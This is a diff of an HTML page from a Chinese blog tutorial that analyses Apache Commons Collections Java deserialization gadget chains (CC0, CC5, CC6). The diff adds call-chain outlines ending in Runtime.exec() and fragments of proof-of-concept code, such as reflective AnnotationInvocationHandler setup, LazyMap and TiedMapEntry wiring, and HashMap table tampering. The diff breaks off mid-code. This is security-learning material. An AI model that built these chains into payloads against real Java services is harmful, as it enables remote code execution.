@@ -3,7 +3,7 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>CommonsCollections - Theoyu</title>
 
-<meta name="description" content="写在前面再回头看看java反序列化三要素  『kick-off』 gadget ==&gt; 寻找重写readobject的类  chain gadget        ==&gt; 将『kick-off』 gadget 和 『sink』gadget连接起来  『sink』 gadget        ==&gt...">
+<meta name="description" content="[toc]写在前面  在程序分析中，一般把漏洞切入点称为『 source 』，不过本文用『 kick - off 』代替，后面的分析会更换称谓。看看java反序列化三要素  『kick-off』 gadget ==&gt; 寻找重写readobject的类  chain gadget        ==&gt; ...">
 <link rel="canonical" href="http://localhost:4000/java/deserialize/CommonsCollections"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
 <meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
@@ -273,7 +273,7 @@
 
     <div class="grid page__grid">
 
-      <div class="page__sidebar d-print-none"><div class="sidebar-toc"><ul class="toc toc--navigator"><li class="toc-h1">Foudation</li><li class="toc-h2"><a href="/java/fundation/Classloader">Classloader</a></li><li class="toc-h2"><a href="/java/fundation/DynamicProxy">DynamicProxy</a></li><li class="toc-h2"><a href="/java/fundation/Reflection">Reflection</a></li><li class="toc-h2"><a href="/java/fundation/Rmi">Rmi</a></li><li class="toc-h1">deserialize</li><li class="toc-h2"><a href="/java/deserialize/preknowledge">preknowledge</a></li><li class="toc-h2"><a href="/java/deserialize/URLDNS">URLDNS</a></li><li class="toc-h2 active"><a href="/java/deserialize/CommonsCollections">CommonsCollections</a></li></ul></div></div><div class="page__main js-page-main has-aside cell cell--auto">
+      <div class="page__sidebar d-print-none"><div class="sidebar-toc"><ul class="toc toc--navigator"><li class="toc-h1">Foudation</li><li class="toc-h2"><a href="/java/fundation/Classloader">Classloader</a></li><li class="toc-h2"><a href="/java/fundation/DynamicProxy">DynamicProxy</a></li><li class="toc-h2"><a href="/java/fundation/Reflection">Reflection</a></li><li class="toc-h2"><a href="/java/fundation/CommandExec">CommandExec</a></li><li class="toc-h2"><a href="/java/fundation/Rmi">Rmi</a></li><li class="toc-h2"><a href="/java/fundation/Agent">Agent</a></li><li class="toc-h2"><a href="/java/fundation/CTFInJava">CTFInJava</a></li><li class="toc-h1">deserialize</li><li class="toc-h2"><a href="/java/deserialize/URLDNS">URLDNS</a></li><li class="toc-h2 active"><a href="/java/deserialize/CommonsCollections">CommonsCollections</a></li><li class="toc-h2"><a href="/java/deserialize/7u21">7u21</a></li><li class="toc-h2"><a href="/java/deserialize/8u20">8u20</a></li><li class="toc-h2"><a href="/java/deserialize/Shiro550">Shiro550</a></li><li class="toc-h2"><a href="/java/deserialize/Fastjson">Fastjson</a></li><li class="toc-h1">VUL-Reproduce</li><li class="toc-h2"><a href="/java/VUL-Reproduce/Rmi_Jndi_Attack">Rmi-JNDI-Attack</a></li><li class="toc-h2"><a href="/java/VUL-Reproduce/Spring">Spring</a></li><li class="toc-h2"><a href="/">Dubbo</a></li><li class="toc-h1">Memory Shell</li></ul></div></div><div class="page__main js-page-main has-aside cell cell--auto">
 
       <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
       <div class="header__title">
@@ -595,7 +595,7 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 </svg>
 <a title="Be cool,but also be warm.
 " href="/">Theoyu</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
-        <ul><li class="navigation__item"><a href="/archive.html">Archive</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+        <ul><li class="navigation__item"><a href="/archive.html">Archive</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="/cs">CS</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
       </nav></div>
   </header>
 </div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
@@ -606,26 +606,26 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
               <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
 
 <!-- end custom main top snippet -->
-<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>CommonsCollections</h1></header><span class="split-space">&nbsp;</span>
-          <a class="edit-on-github"
-            title="Edit on Github"
-            href="https://github.com/yuuuuu422/yuuuuu422.github.io/tree/main/_java/deserialize/2.3-CommonsCollections.md">
-            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="CommonsCollections"><div class="article__info clearfix"><ul class="right-col menu"></ul></div><meta itemprop="author" content="Theoyu"/><meta itemprop="datePublished" content="2022-02-16T00:39:32+08:00"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>CommonsCollections</h1></header></div><meta itemprop="headline" content="CommonsCollections"><div class="article__info clearfix"><ul class="right-col menu"><li><i class="far fa-eye"></i> <span class="js-pageview" data-page-key="CommonsCollections">0</span> views</li></ul></div><meta itemprop="author" content="Theoyu"/><meta itemprop="datePublished" content="2022-10-28T11:45:07+08:00"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
 
 <!-- end custom article top snippet -->
-<div class="article__content" itemprop="articleBody"><h1 id="写在前面">写在前面</h1>
+<div class="article__content" itemprop="articleBody"><p>[toc]</p>
 
-<p>再回头看看java反序列化三要素</p>
+<h2 id="写在前面">写在前面</h2>
+
+<p><img src="../../assets/images/image-20220222213434139.png" alt="image-20220222213434139" /></p>
+
+<blockquote>
+  <p>在程序分析中，一般把漏洞切入点称为『 source 』，不过本文用『 kick - off 』代替，后面的分析会更换称谓。</p>
+</blockquote>
+
+<p>看看java反序列化三要素</p>
 
 <ol>
   <li>『kick-off』 gadget ==&gt; 寻找重写readobject的类</li>
   <li>chain gadget        ==&gt; 将『kick-off』 gadget 和 『sink』gadget连接起来</li>
   <li>『sink』 gadget        ==&gt; RCE触发点</li>
 </ol>
-
-<p>同p神所说的，网上大多数关于反序列化的教程，都是介绍一下序列化流，然后给你说一下本地readobject打自己，最后好的差不多啦我们来开始cc链。</p>
-
-<p>说实话之前跟着网上的一些教程走，我人是麻的，就不明白为什么他要这样构造chain，为什么就打通了，感觉完全是站在上帝视角，而不能从一个漏洞挖掘者的角度分析。</p>
 
 <p>在php反序列化链的挖掘中，我们也可以带入上面的三要素，『kick-off』我理解为<code class="language-plaintext highlighter-rouge">__destruct()</code>或者<code class="language-plaintext highlighter-rouge">__wakeup()</code>,『sink』则为类似<code class="language-plaintext highlighter-rouge">call_user_func</code>等的回调函数。看师傅们挖掘php的pop链，一般都是从『kick-off』出发，去把chain的走向引去『sink』。</p>
 
@@ -652,11 +652,11 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p><code class="language-plaintext highlighter-rouge">CollectionUtils.containsAny</code>可以返回两个集合是否含有相同元素的bool值。同样CC包还提供了求集合的交集元素，并集元素等函数。就是这样一个在数据结构层的操作，如果开发者满足其环境条件，并提供了反序列化的入口，我们就可以达到RCE的目的。</p>
 
-<h1 id="cc-0">CC 0</h1>
+<h2 id="cc-0">CC 0</h2>
 
 <p>这并不是传统cc1的链子，是p神在java漫谈中所谈及的，相比于cc1的动态代理的利用，更加好理解一些。</p>
 
-<h2 id="利用要求">利用要求</h2>
+<h3 id="利用要求">利用要求</h3>
 
 <ul>
   <li><strong>cc3.1～3.2.1</strong></li>
@@ -672,7 +672,7 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 &lt;/dependency&gt;
 </code></pre></div></div>
 
-<h2 id="完整poc">完整poc</h2>
+<h3 id="完整poc">完整poc</h3>
 
 <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test4</span> <span class="o">{</span>
     <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
@@ -710,7 +710,7 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 <span class="o">}</span>
 </code></pre></div></div>
 
-<h2 id="从-sink出发">从 sink出发</h2>
+<h3 id="从-sink出发">从 sink出发</h3>
 
 <p>从poc中也能很明显感受到,<strong>InvokerTransformer</strong>这个类有一些问题，我们的payload就是写在这个类的构造函数中。</p>
 
@@ -730,11 +730,11 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>执行即可弹出计算器，跟进<code class="language-plaintext highlighter-rouge">transform</code>:</p>
 
-<p>org.apache.commons.collections.functors.InvokerTransformer-&gt;<code class="language-plaintext highlighter-rouge">transfrom(Object input)</code></p>
+<p><strong>org.apache.commons.collections.functors.InvokerTransformer</strong>-&gt;<code class="language-plaintext highlighter-rouge">transfrom(Object input)</code></p>
 
 <p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211122084854.png" alt="image-20211122084854543" /></p>
 
-<p>上面的构造函数，即一一对应我们传入的methodName,paramTypes以及args，重点在下面的<code class="language-plaintext highlighter-rouge">transform</code>，非常典型的反射调用。</p>
+<p>上面的构造函数，即一一对应我们传入的<strong>methodName</strong>,<strong>paramTypes</strong>以及<strong>args</strong>，重点在下面的<code class="language-plaintext highlighter-rouge">transform</code>，非常典型的反射调用。</p>
 
 <p>ok sink我们找着了，但这样只能自己打自己，模拟一下客户端服务端模式试一试</p>
 
@@ -742,9 +742,9 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>理想的情况下，服务端应该什么也不需要准备，但是由于sink并不是在readobject的时候触发，而是转化为特定的对象，重新执行，并且还需要传入一个恶意的对象作为参数，这就需要服务端<strong>主动配合</strong>我们的payload，满足其上下文要求。越想越离谱，接下来就需要逐一构造chain，来<strong>简化服务端利用的需求</strong></p>
 
-<h2 id="构造chain">构造chain</h2>
+<h3 id="构造chain">构造chain</h3>
 
-<h3 id="chainedtransformer">ChainedTransformer</h3>
+<h4 id="chainedtransformer">ChainedTransformer</h4>
 
 <p>先解决服务端传入<code class="language-plaintext highlighter-rouge">Runtime.getRuntime()</code>的这个问题</p>
 
@@ -850,7 +850,7 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>针对这个目标所引申的两种攻击方法：<code class="language-plaintext highlighter-rouge">TransformedMap</code>和<code class="language-plaintext highlighter-rouge">LazyMap</code>，前者引出了cc0，后者成就了cc 1 3 5 6 7。</p>
 
-<h3 id="transformedmap">TransformedMap</h3>
+<h4 id="transformedmap">TransformedMap</h4>
 
 <p>上述我们写入的<strong>ChainedTransformer</strong>是一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，<strong>只需要添加数据至map中</strong>就会<strong>自动调用</strong>这个转换链的<strong>transform</strong>。</p>
 
@@ -887,7 +887,7 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 <span class="o">}</span>
 </code></pre></div></div>
 
-<h3 id="abstractinputcheckedmapdecorator">AbstractInputCheckedMapDecorator</h3>
+<h4 id="abstractinputcheckedmapdecorator">AbstractInputCheckedMapDecorator</h4>
 
 <p>在TransformedMap的父类AbstractInputCheckedMapDecorator中，有一个静态内部类 <strong>MapEntry</strong> ,该类 <code class="language-plaintext highlighter-rouge">setValue()</code> 中调用了 <code class="language-plaintext highlighter-rouge">checkSetValue()</code> 方法.</p>
 
@@ -975,7 +975,7 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/01/20220127144033.png" alt="image-20220127144033596" /></p>
 
-<h2 id="寻找-kick-off-">寻找『 kick-off 』</h2>
+<h3 id="寻找-kick-off-">寻找『 kick-off 』</h3>
 
 <p>其实走到这，触发已经比较容易了，在jdk1.7中就存在一个完美的readobject复写点的类<code class="language-plaintext highlighter-rouge">sun.reflect.annotation.AnnotationInvocationHandler</code></p>
 
@@ -1011,47 +1011,40 @@ var6: fakevalue
 
 <p>这就解释了为什么我们事先要求传入TransformedMap的键名为<strong>value</strong>，不然获取的var7为空，是无法走到<code class="language-plaintext highlighter-rouge">var5.setValue()</code>。</p>
 
+<p>由于<strong>AnnotationInvocationHandler</strong>的构造函数是默认访问权限，通过默认修饰符修饰的方法只能同包访问 , 因此这里无法直接访问，我们反射修改权限即可：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
+<span class="nc">Constructor</span> <span class="n">construct</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+<span class="n">construct</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="nc">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">construct</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Retention</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map2</span><span class="o">);</span>
+</code></pre></div></div>
+
+<p>这里传入的<code class="language-plaintext highlighter-rouge">Rentetion.class</code>也就是对应下方的<code class="language-plaintext highlighter-rouge">var1</code>，if判断语句需要满足三个条件才能对<code class="language-plaintext highlighter-rouge">this.memberValues</code>赋值，而<strong>Retention</strong> 属于 <strong>java.lang.annotation</strong>包下，自然空调满足。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AnnotationInvocationHandler</span><span class="o">(</span><span class="nc">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="nc">Annotation</span><span class="o">&gt;</span> <span class="n">var1</span><span class="o">,</span> <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">var2</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">Class</span><span class="o">[]</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">var1</span><span class="o">.</span><span class="na">getInterfaces</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">isAnnotation</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">var3</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">var3</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="nc">Annotation</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">type</span> <span class="o">=</span> <span class="n">var1</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span> <span class="o">=</span> <span class="n">var2</span><span class="o">;</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">AnnotationFormatError</span><span class="o">(</span><span class="s">"Attempt to create proxy for a non-annotation type."</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
 <p>至此，我们终于走完了cc链中的第一条。</p>
 
-<h2 id="jdk18为什么不行">jdk1.8为什么不行</h2>
+<h3 id="jdk18为什么不行">jdk1.8为什么不行</h3>
 
 <p>在Java 8u71之后，<code class="language-plaintext highlighter-rouge">sun.reflect.annotation.AnnotationInvocationHandler</code>的readobject发生了变动</p>
 
 <p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/01/20220125184650.png" alt="image-20220125184650286" /></p>
 
-<p>可以看到这里不再针对我们想要赋值的map进行操作，而是重新创建了一个<strong>LinkedHashMapx</strong>操作，那也就达不到触发sink的目的了。</p>
+<p>可以看到这里不再针对我们想要赋值的map进行操作，而是重新创建了一个<strong>LinkedHashMap</strong>操作，那也就达不到触发sink的目的了。</p>
 
-<h1 id="cc-1">CC 1</h1>
+<h2 id="cc-5">CC 5</h2>
 
-<h2 id="利用要求-1">利用要求</h2>
-
-<p>同cc 0</p>
-
-<ul>
-  <li><strong>cc3.1～3.2.1</strong></li>
-  <li><strong>jdk 1.7</strong>(8u71之前都可以)</li>
-</ul>
-
-<p>mvn：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;dependency&gt;
-    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
-    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
-    &lt;version&gt;3.1&lt;/version&gt;
-&lt;/dependency&gt;
-</code></pre></div></div>
-
-<p>​</p>
-
-<h1 id="cc-2">CC 2</h1>
-
-<h1 id="cc-3">CC 3</h1>
-
-<h1 id="cc-4">CC 4</h1>
-
-<h1 id="cc-5">CC 5</h1>
-
-<h2 id="利用要求-2">利用要求</h2>
+<h3 id="利用要求-1">利用要求</h3>
 
 <p>条件：</p>
 
@@ -1069,7 +1062,24 @@ var6: fakevalue
 &lt;/dependency&gt;
 </code></pre></div></div>
 
-<h2 id="完整poc-1">完整poc</h2>
+<h3 id="完整poc-1">完整poc</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ObjectInputStream.readObject()
+		BadAttributeValueExpException.readObject()
+        TiedMapEntry.toString()
+            LazyMap.get()
+                ChainedTransformer.transform()
+                    ConstantTransformer.transform()
+                    InvokerTransformer.transform()
+                        Method.invoke()
+                            Class.getMethod()
+                    InvokerTransformer.transform()
+                        Method.invoke()
+                            Runtime.getRuntime()
+                    InvokerTransformer.transform()
+                        Method.invoke()
+                            Runtime.exec()
+</code></pre></div></div>
 
 <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Poc</span> <span class="o">{</span>
     <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span><span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
@@ -1106,11 +1116,46 @@ var6: fakevalue
 <span class="o">}</span>
 </code></pre></div></div>
 
-<h2 id="构造chain-1">构造chain</h2>
+<h3 id="构造chain-1">构造chain</h3>
 
-<p>cc5的 sink 和 cc1 完全相同，之前所说 jdk 在 1.8之后对 AnnotationInvocationHandler 类做了限制，所以 TiedMapEntry 和 BadAttributeValueExpException 就被挖掘了出来。这可能是最浅显易懂的一条 cc 链。</p>
+<p>cc5的 sink 和 cc0 完全相同，之前所说 jdk 在 1.8之后对 AnnotationInvocationHandler 类做了限制，所以 TiedMapEntry 和 BadAttributeValueExpException 就被挖掘了出来。这可能是最浅显易懂的一条 cc 链。</p>
 
-<p>世界线收束到<code class="language-plaintext highlighter-rouge">LazyMap.get()</code>,在TiedMapEntry类中，有如下几个方法：</p>
+<p>接着cc0所说的，为了触发sink-&gt;<code class="language-plaintext highlighter-rouge">ChainedTransformer</code>，我们需要以下两点</p>
+
+<ul>
+  <li><strong>找到一个 <code class="language-plaintext highlighter-rouge">tansform()</code> 方法 , 该方法所属的实例对象是可控的.</strong></li>
+  <li><strong>找到一个重写的 <code class="language-plaintext highlighter-rouge">readObject()</code> 方法 , 该方法会自动调用 <code class="language-plaintext highlighter-rouge">transform()</code> 方法.</strong></li>
+</ul>
+
+<h4 id="lazymap">LazyMap</h4>
+
+<p>世界线收束到<strong>LazyMap</strong>：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">LazyMap</span> <span class="kd">extends</span> <span class="nc">AbstractMapDecorator</span> <span class="kd">implements</span> <span class="nc">Map</span><span class="o">,</span> <span class="nc">Serializable</span><span class="o">{</span>    
+  <span class="c1">//...简要写几个重要的方法</span>
+  <span class="kd">protected</span> <span class="kd">final</span> <span class="nc">Transformer</span> <span class="n">factory</span><span class="o">;</span>
+  <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Map</span> <span class="nf">decorate</span><span class="o">(</span><span class="nc">Map</span> <span class="n">map</span><span class="o">,</span> <span class="nc">Transformer</span> <span class="n">factory</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="nf">LazyMap</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="n">factory</span><span class="o">);</span>
+	<span class="o">}</span>
+  <span class="kd">public</span> <span class="nc">Object</span> <span class="nf">get</span><span class="o">(</span><span class="nc">Object</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(!</span><span class="kd">super</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
+        <span class="nc">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">factory</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+    <span class="o">}</span>
+	<span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>在<code class="language-plaintext highlighter-rouge">LazyMap.get()</code>方法中，触发了<code class="language-plaintext highlighter-rouge">this.factory.transform(key);</code>，而刚好factory就支持Transformer类型，虽然LazyMap的构造方法是protected修饰，不过我们可以使用<code class="language-plaintext highlighter-rouge">decorate()</code>方法返回一个LazyMap。</p>
+
+<p>那么现在需要找的就是可以触发<code class="language-plaintext highlighter-rouge">map.get()</code>的点。</p>
+
+<h4 id="tiedmapentry">TiedMapEntry</h4>
+
+<p>在TiedMapEntry类中，有如下几个方法：</p>
 
 <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TiedMapEntry</span> <span class="kd">implements</span> <span class="nc">Entry</span><span class="o">,</span> <span class="nc">KeyValue</span><span class="o">,</span> <span class="nc">Serializable</span> <span class="o">{</span>
     <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="o">-</span><span class="mi">8453869361373831205L</span><span class="o">;</span>
@@ -1151,7 +1196,7 @@ var6: fakevalue
 
 <p>那么现在我们只需要找到可以触发<code class="language-plaintext highlighter-rouge">toString()</code>的点即可。</p>
 
-<h2 id="寻找-kick-off--1">寻找『 kick-off 』</h2>
+<h3 id="寻找-kick-off--1">寻找『 kick-off 』</h3>
 
 <p><code class="language-plaintext highlighter-rouge">BadAttributeValueExpException.readObject</code></p>
 
@@ -1188,16 +1233,29 @@ var6: fakevalue
         <span class="n">val</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">,</span><span class="n">tiedMapEntry</span><span class="o">);</span>
 </code></pre></div></div>
 
-<h1 id="cc-6">CC 6</h1>
+<h2 id="cc-6">CC 6</h2>
 
-<h2 id="利用要求-3">利用要求</h2>
+<h3 id="利用要求-2">利用要求</h3>
 
 <ul>
   <li><strong>cc3.1～3.2.1</strong></li>
   <li><strong>jdk 版本暂无限制</strong></li>
 </ul>
 
-<h2 id="完整poc-2">完整poc</h2>
+<h3 id="完整poc-2">完整poc</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ObjectInputStream.readObject()
+		HashSet.readObject()
+				HashMap.put()
+				HashMap.hash()
+						TiedMapEntry.hashCode()
+						TiedMapEntry.getValue()
+								LazyMap.get()
+										ChainedTransformer.transform()
+										InvokerTransformer.transform()
+										Method.invoke()
+												Runtime.exec()
+</code></pre></div></div>
 
 <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Poc</span> <span class="o">{</span>
     <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span><span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
@@ -1244,9 +1302,9 @@ var6: fakevalue
 <span class="o">}</span>
 </code></pre></div></div>
 
-<h2 id="构造chain-2">构造chain</h2>
+<h3 id="构造chain-2">构造chain</h3>
 
-<p>如cc5所提到的，我们可以通过<code class="language-plaintext highlighter-rouge">TiedMapEntry.hashcode()</code>触发<code class="language-plaintext highlighter-rouge">LazyMap.put()</code>。</p>
+<p>如cc5所提到的，我们可以通过<code class="language-plaintext highlighter-rouge">TiedMapEntry.hashcode()</code>触发<code class="language-plaintext highlighter-rouge">LazyMap.get()</code>。</p>
 
 <p>说到hashcode，就又不得不提URLDNS这条链，我们知道只要对hashmap进行put，就会对键值进行<code class="language-plaintext highlighter-rouge">hashcode()</code>运算。</p>
 
@@ -1301,9 +1359,52 @@ var6: fakevalue
 
 <p>就会触发<code class="language-plaintext highlighter-rouge">hashcode()</code>导致命令执行并且改变其类型。</p>
 
-<h2 id="寻找--kick-off-">寻找 『 kick-off 』</h2>
+<h3 id="反射修改hashmap">反射修改hashmap</h3>
 
-<p>顺应上面的问题，<strong>Hashset</strong>被挖掘了出来，首先我们先了解一下什么是Hashset：</p>
+<p>那么现在想法其实也很简单，不能在构造的时候通过<code class="language-plaintext highlighter-rouge">put()</code>修改 key ，那我们完全可以通过反射实现：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">HashMap</span> <span class="n">innermap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
+<span class="nc">Map</span> <span class="n">map</span> <span class="o">=</span>  <span class="nc">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innermap</span><span class="o">,</span><span class="n">chain</span><span class="o">);</span>
+<span class="nc">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TiedMapEntry</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="mi">123</span><span class="o">);</span>
+
+<span class="nc">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
+<span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"123"</span><span class="o">,</span><span class="s">"456"</span><span class="o">);</span>
+<span class="c1">//拿到map的table</span>
+<span class="nc">Field</span> <span class="n">table</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.HashMap"</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"table"</span><span class="o">);</span>
+<span class="n">table</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="nc">Object</span><span class="o">[]</span> <span class="n">array</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Object</span><span class="o">[])</span><span class="n">table</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">hashmap</span><span class="o">);</span>
+<span class="nc">Object</span> <span class="n">node</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+<span class="k">for</span><span class="o">(</span><span class="nc">Object</span> <span class="nl">o:</span><span class="n">array</span><span class="o">){</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">o</span><span class="o">!=</span><span class="kc">null</span><span class="o">){</span>
+        <span class="n">node</span> <span class="o">=</span><span class="n">o</span><span class="o">;</span>
+        <span class="k">break</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+<span class="c1">//修改table的key</span>
